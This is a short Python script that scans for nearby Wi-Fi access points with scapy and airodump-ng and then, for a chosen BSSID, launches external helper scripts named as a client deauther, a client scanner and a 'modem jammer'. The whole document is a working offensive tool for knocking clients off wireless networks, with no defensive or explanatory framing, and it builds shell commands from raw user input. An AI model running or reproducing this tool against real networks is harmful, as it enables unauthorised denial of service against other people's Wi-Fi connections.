#!/usr/bin/env python
import os
import sys
from scapy.all import *
ap_list = []
def PH(pkt):
	global ap_list
	if pkt.haslayer(Dot11):
		if pkt.type == 0 and pkt.subtype == 8:
			if pkt.addr2 not in ap_list:
				ap_list.append(pkt.addr2)
				print str(ap_list.index(pkt.addr2)) + "-> " + pkt.info + " = " + str(pkt.addr2)
os.system('gnome-terminal --zoom 0.7 -e "airodump-ng mon0"')
sniff(iface="mon0" , prn = PH , store = 0)
os.system('rm /root/Desktop/JAMMER/client.tmp')
os.system('pkill airodump-ng')
bssid = int(raw_input("No:"))
bssid = ap_list[bssid].upper()
hssid = int(raw_input("H_No:"))
hssid = ap_list[hssid].upper()
uyku = raw_input("SLEEP:")
attack = raw_input("ATTACK:")
os.system('gnome-terminal --zoom 0.7 --tab -e "/root/Desktop/JAMMER/client_deauther.sh '+bssid+' '+uyku+' '+attack+'" --tab -e "/root/Desktop/JAMMER/client_scanner.sh '+bssid+'" --tab -e "/root/Desktop/JAMMER/modem_jammer.sh '+bssid+' '+uyku+' '+attack+' '+hssid+'"')
